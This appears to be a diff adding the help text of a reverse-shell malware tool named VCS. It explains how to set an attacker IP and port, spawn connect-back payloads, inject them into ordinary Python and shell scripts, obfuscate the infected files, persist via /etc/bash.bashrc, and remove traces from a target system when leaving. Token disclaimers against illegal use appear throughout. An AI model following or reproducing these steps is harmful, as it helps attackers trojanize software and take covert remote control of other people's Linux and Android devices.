@@ -1,0 +1,79 @@
+commands:
+  
+      vset : to set attacker address, exampleL: vset 10.0.0.23  4444 
+                                                     _________  ____
+                                                      IP Addr   Port
+
+      target: Set target system, example: target linux, target termux (Windows payload is not available in this version, check github.com/Mahmoud7Osman/ for updates)
+
+
+
+      vcs-spawn: Spawn a payload to connect back to attacker and start the reverse shell, example: vcs-spawn  payload.sh
+ 
+
+
+
+      vcs-remove: Check if your system is infected with this virus and remove it: example: vcs-remove
+
+
+
+      vcs-exploit: Start the exploit, example: vcs-exploit
+                                                                      Argument 1         Argument 2           Argument 3
+                                                                  __________________  ________________  _______________________
+      ipy: Inject shell payload in a python script, example: ipy  spawned_payload.sh  target_script.py  infected_python_file.py (it is better to obfuscate this file with compileall module in python)
+                                                                  ------------------  ----------------  ------------------------
+                                                                  your shell payload  your normal       the new python script
+                                                                                         python script      (Infected)
+      ish: Inject shell payload in another shell script, example: ish   spawned_payload.sh  target_shell_script.sh   infected_shell_script.sh (the same as 'ipy')
+
+
+
+      cls: Clear screen, example: cls
+
+   
+      
+      help: get help, example: help       
+     
+
+
+      exit: exit vcs, example: exit
+
+
+
+tips:
+  
+      - prepare target system with 'target' command, then set the address with 'vset' command, then spawn a payload with 'vcs-spawn' command. 
+     
+      - you can inject your payload in a python script with 'ipy', and in a shell script with 'ish' (you can obfuscate the malicious python script with 'compileall' lib)
+
+      - the payload execution will be injected at '/etc/bash.bashrc' and the data at '/etc/system.cfg', to remove payload from your system type: vcs-remove. in the VCS console 
+
+      - Do not use it for illegal purposes
+      
+      - Support exploiting android (termux) and all linux os, this tool run in termux and linux
+
+
+Next version:
+  
+      - Windows exploit will be available in the next version
+
+      - Machine code injection will be supported
+   
+      - Process injection will be supported
+
+      - Automatic Proccess checker will be available
+
+
+Warning:
+
+     - Before leaving the session check processes with 'ps aux | grep .cfg' and kill running payloads.  
+
+     - When you want to leave target system forever delete this files:
+                    /etc/system.cfg
+                    /var/sys.cfg*
+
+     - Optionaly: You need to edit the /etc/bash.bashrc and remove the line that execute the payload
+
+
+     - This tool is dangerous, please do not use it with illegal actions
+-----------------------------------------------------------------------------------------------------------------------------------
